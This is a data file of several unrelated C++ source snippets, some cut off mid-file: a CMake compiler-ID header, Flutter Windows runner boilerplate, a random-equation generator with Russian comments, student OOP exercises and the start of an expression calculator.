    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <fstream>\r\n#include <iomanip>\r\nusing namespace std;\r\n\r\nint main() {\r\n\tsetlocale(LC_ALL, \"Rus\");\r\n\tsrand(time(NULL));\r\n\tstd::ofstream out;\r\n\t//\u0441\u043e\u0437\u0434\u0430\u044e \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435\r\n\tint result;\r\n\tdouble long printresult;\r\n\tint firstparam;\r\n\tint ffirstparam;\r\n\tint secondparam;\r\n\tint msecondparam;\r\n\tint smartparam;\r\n\tint ssmartparam;\r\n\tint count;\r\n\tint step;\r\n\tint CountClon;\r\n\tint printcount;\r\n\tint i = 0;\r\n\tint answer;\r\n\tbool start = true;\r\n\tint col;\r\n\tout.open(\"col.txt\");\r\n\t//\u0441\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u044e \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u043e\u0432\u0442\u043e\u0440\u0435\u043d\u0438\u0439 \u043d\u0443\u0436\u043d\u043e \u0438 \u043a\u0430\u043a\u043e\u0439 \u0431\u0443\u0434\u0435\u0442 \u043e\u0442\u0432\u0435\u0442\r\n\tcout << \"\u0421\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u043e\u0432\u0442\u043e\u0440\u0435\u043d\u0438\u0439 \u0432\u0430\u043c \u043d\u0430\u0434\u043e?\" << endl << \">>>\";\r\n\tcin >> col;\r\n\tcout << \"\u041a\u0430\u043a\u043e\u0439 \u043e\u0442\u0432\u0435\u0442 \u0432\u0430\u043c \u043d\u0443\u0436\u0435\u043d \u0432\u0430\u043c \u043d\u0443\u0436\u0435\u043d?\" << endl << \">>>\";\r\n\t//____________________\r\n\tif (col == 9931993) {\r\n\t\tstart = false;\r\n\t}\r\n\r\n\tcin >> answer;\r\n\t//\u0441\u043e\u0437\u0434\u0430\u044e \u0446\u0438\u043a\u043b\r\n\twhile (start)\r\n\t{\r\n\t\t//\u0441\u043e\u0437\u0434\u0430\u044e \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430\r\n\t\tstep = rand() % 40 + 1;\r\n\t\tcount = rand() % 40 + 1;\r\n\t\tCountClon = count;\r\n\t\tffirstparam = rand() % 200000 + (-2000);\r\n\t\tfirstparam = rand() % 200000 + (-2000);\r\n\t\tsecondparam = rand() % 200000 + (-2000);\r\n\t\tmsecondparam = rand() % 200000 + (-2000);\r\n\t\tsmartparam = rand() % 200 + (-20);\r\n\t\tssmartparam = rand() % 200 + (-20);\r\n\t\t//\u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u043f\u043e\u0434\u0431\u043e\u0440\u0430:\r\n\t\t//cout << count << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \";\r\n\t\t//out << count << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \":\r\n\t\tprintcount = count;\r\n\t\tfor (int i = 0; i < step - 1; i++)\r\n\t\t{\r\n\t\t\tcount *= CountClon;\r\n\t\t}\r\n\t\t//\u0441\u0447\u0438\u0442\u0430\u044e \u043e\u0442\u0432\u0435\u0442\r\n\t\tresult = ssmartparam * msecondparam - smartparam * count + secondparam + firstparam + ffirstparam;\r\n\t\tprintresult = ssmartparam * msecondparam - smartparam * count + secondparam + firstparam + ffirstparam;\r\n\t\t//\u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u043f\u043e\u0434\u0431\u043e\u0440\u0430:\r\n\t\t//cout << result << endl;\r\n\t\t//cout << result << endl;\r\n\t\t//\u0415\u0441\u043b\u0438 \u043e\u0442\u0432\u0435\u0442 \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0432\u0435\u043d \u0442\u043e\u043c\u0443 \u0447\u0442\u043e \u0443\u043a\u0430\u0437\u0430\u043b \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\r\n\t\tif (result == (answer) && start) {\r\n\t\t\t//\u0432\u044b\u0432\u043e\u0436\u0443 \u0432  \u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\r\n\t\t\tcout << ssmartparam << \" * \" << msecondparam << \" - \" << smartparam << \" * \" << printcount << \"^\" << step << \" + \" << secondparam << \" + \" << firstparam << \" + \" << ffirstparam << \" = \" << result << endl;\r\n\t\t\t//\u0441\u043e\u0445\u0440\u0430\u043d\u044f\u044e \u0432 \u0444\u0430\u0439\u043b\r\n\t\t\tout << msecondparam << \" - \" << smartparam << \" * \" << printcount << \"^\" << step << \" + \" << firstparam << \" + \" << secondparam << \" = \" << result << endl;\r\n\t\t\ti++;\r\n\t\t\tif (i == col) {\r\n\t\t\t\t//\u0437\u0430\u043a\u0440\u044b\u0432\u0430\u044e \u0444\u0430\u0439\u043b\r\n\t\t\t\tout.close();\r\n\t\t\t\tstart = false;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"iterceptor_alice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//TASK 1\r\n// #include<iostream>\r\n// using namespace std;\r\n// class shape\r\n// {\r\n//   private:\r\n//   float height,width,length;\r\n//   public: \r\n//   shape()\r\n//   {\r\n//     height=0;\r\n//     width=0;\r\n//     length=0;\r\n//   }  \r\n//   shape(float h,float w,float l)\r\n//   {\r\n//     height=h;\r\n//     width=w;\r\n//     length=l;\r\n//   }\r\n//   void setheight(float h)\r\n//   {\r\n//     height=h;\r\n//   }\r\n//   void setwidth(float w)\r\n//   {\r\n//     width=w;\r\n//   }\r\n//   void setlength(float l)\r\n//   {\r\n//     length=l;\r\n//   }\r\n//   float getheight()\r\n//   {\r\n//     return height;\r\n//   }\r\n//   float getwidth()\r\n//   {\r\n//     return width;\r\n//   }\r\n//   float getlength()\r\n//   {\r\n//     return length;\r\n//   }\r\n//   void calculateArea()\r\n//   {\r\n//     cout<<\"Area calculation function specifier\"<<endl;\r\n//   }\r\n//   void calculatePerimeter()\r\n//   {\r\n//     cout<<\"Perimeter calculation function specifier\"<<endl;\r\n//   }\r\n//   void print()\r\n//   {\r\n//     cout<<\"length is:\"<<length<<endl;\r\n//     cout<<\"width is:\"<<width<<endl;\r\n//     cout<<\"height is:\"<<height<<endl;\r\n//   }\r\n\r\n\r\n// };\r\n// class circle :public shape\r\n// { \r\n//     private:\r\n//     float radius,area,perimeter;\r\n//     public:\r\n//     circle(){};\r\n//     void set_radius(float r)\r\n//     {\r\n//         radius = r;\r\n//     }\r\n//     void calculateArea()\r\n//     {\r\n//         area=3.1417*radius*radius;\r\n//     }\r\n//     float getarea() const\r\n//     {\r\n//         return area;\r\n//     }\r\n//     void  calculatePerimeter()\r\n//     {\r\n//           perimeter=2*3.1417*radius;\r\n         \r\n//     }\r\n//     float getperimeter() const\r\n//     {\r\n//         return perimeter;\r\n//     }\r\n//       void print()\r\n//       {\r\n//         cout<<\"Area of circle with radius: \"<<radius<<\" is:\"<<area<<endl;\r\n//         cout<<\"Perimeter of circle with radius: \"<<radius<<\" is:\"<<perimeter<<endl;\r\n//       }\r\n\r\n// };\r\n// class rectangle : public shape\r\n// {\r\n//       private:\r\n//       float length,width,area,perimeter;\r\n//       public:\r\n//       shape c;\r\n//      //length=c.getlength();\r\n//      rectangle(float l,float w):length(l),width(w){};\r\n//      void calculateArea()\r\n//      {\r\n//         area=length*width;\r\n//         //cout<<\"Area is\"<<area<<endl;\r\n//      }\r\n//      void calculatePerimeter()\r\n//      {\r\n//         perimeter=2*(length*width);\r\n//        // cout<<\"Perimeter is\"<<perimeter<<endl;\r\n//      }\r\n//     void print()\r\n\r\n//     {\r\n//         cout<<\"Perimeter of rectangle with length: \"<<length<<\" and width: \"<<width<<\" is:\"<<perimeter<<endl;\r\n//         cout<<\"Area of rectangle with length: \"<<length<<\" and width: \"<<width<<\" is:\"<<area<<endl;\r\n//     }\r\n\r\n// };\r\n// class triangle :public shape\r\n// {\r\n//      private:\r\n//      float base,height,h,area,perimeter;\r\n//      public:\r\n//      triangle(float b,float h,float h1):base(b),height(h),h(h1){};\r\n//      void calculateArea()\r\n//      {\r\n//         area=(base*height)/2;\r\n    \r\n//      }\r\n//      void calculatePerimeter()\r\n//      {\r\n//         perimeter=base+height+h;\r\n//      }\r\n//      void print()\r\n//      {\r\n//         cout<<\"\\nperimeter of triangle is:\"<<perimeter<<endl;\r\n//         cout<<\"Area of triangle is: \"<<area<<endl;\r\n//      }\r\n\r\n    \r\n// };\r\n// int main()\r\n// {\r\n//     shape *obj;\r\n//     obj=new shape(); \r\n    \r\n\r\n//     circle *obj1;\r\n//     obj1=new circle();\r\n//     obj1->set_radius(5);\r\n//     obj1->calculateArea();\r\n//     obj1-> calculatePerimeter();\r\n//     cout<<\"****************************\"<<endl;\r\n//     cout<<\"For circle: \\n\"<<endl;\r\n//     obj1->print();\r\n\r\n//  rectangle *obj3;\r\n//  obj3=new rectangle(5,3);\r\n//  obj3->calculateArea();\r\n//  obj3->calculatePerimeter();\r\n//   cout<<\"****************************\"<<endl;\r\n//  cout<<\"For rectangle:\\n\"<<endl;\r\n//  obj3->print();\r\n \r\n//  triangle *obj2;\r\n//  obj2=new triangle(5.4,8.6,4);\r\n//  obj2->calculateArea();\r\n//  obj2->calculatePerimeter();\r\n//   cout<<\"****************************\"<<endl;\r\n//   cout<<\"For triangle:\"<<endl;\r\n//  obj2->print();\r\n\r\n\r\n// delete obj,obj1,obj2,obj3;\r\n//     return 0;\r\n// }\r\n\r\n\r\n\r\n\r\n\r\n//Task 3\r\n\r\n// #include<iostream>\r\n// using namespace std;\r\n// class Animals\r\n// {\r\n//   public:\r\n//   void move()\r\n//   {\r\n//      cout<<\"Animals can move\"<<endl;\r\n//   }\r\n//   void eat()\r\n//   {\r\n//        cout<<\"Animals can eat\"<<endl;\r\n//   }\r\n// };\r\n// class lions:public Animals\r\n// {\r\n//     public:\r\n//     lions()\r\n//     {\r\n\r\n//     }\r\n//     void move  ()\r\n//     {\r\n//         cout<<\"Lion can run faster\"<<endl;\r\n//     }\r\n//     void eat()\r\n//     {\r\n//         cout<<\"Lions eat meat\"<<endl;\r\n//     }\r\n// };\r\n// class Elephants:public Animals\r\n// {\r\n//     public:\r\n//      void move  ()\r\n//     {\r\n//         cout<<\"Elephant can walk slowly\"<<endl;\r\n//     }\r\n//     void eat()\r\n//     {\r\n//         cout<<\"Elephants eat grass.\"<<endl;\r\n//     }\r\n// };\r\n// class Snakes:public Animals\r\n// {\r\n//     public:\r\n//      void move  ()\r\n//     {\r\n//         cout<<\"Snake can move on ground\"<<endl;\r\n//     }\r\n//     void eat()\r\n/",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\n#include <sstream>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nbool isOperator(char c) {\r\n\treturn c == '+' || c == '-' || c == '*' || c == '/' || c == '^' || c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q';\r\n}\r\n\r\nbool isDigit(char c) {\r\n\treturn c >= '0' && c <= '9';\r\n}\r\n\r\nbool isLeftParenthesis(char c) {\r\n\treturn c == '(';\r\n}\r\n\r\nbool isRightParenthesis(char c) {\r\n\treturn c == ')';\r\n}\r\n\r\nbool isWhiteSpace(char c) {\r\n\treturn c == ' ' || c == '\\t' || c == '\\n';\r\n}\r\n\r\nbool isInvalidChar(char c) {\r\n\treturn !isOperator(c) && !isDigit(c) && !isLeftParenthesis(c) && !isRightParenthesis(c) && !isWhiteSpace(c);\r\n}\r\n\r\nbool isOperatorHigherOrEqual(char op1, char op2) {\r\n\tif ((op1 == '*' || op1 == '/' || op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '+' || op2 == '-')) {\r\n\t\treturn true;\r\n\t}\r\n\tif ((op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '*' || op2 == '/')) {\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\ndouble calculate(double operand1, double operand2, char op) {\r\n\tswitch (op) {\r\n\t\tcase '+':\r\n\t\t\treturn operand1 + operand2;\r\n\t\tcase '-':\r\n\t\t\treturn operand1 - 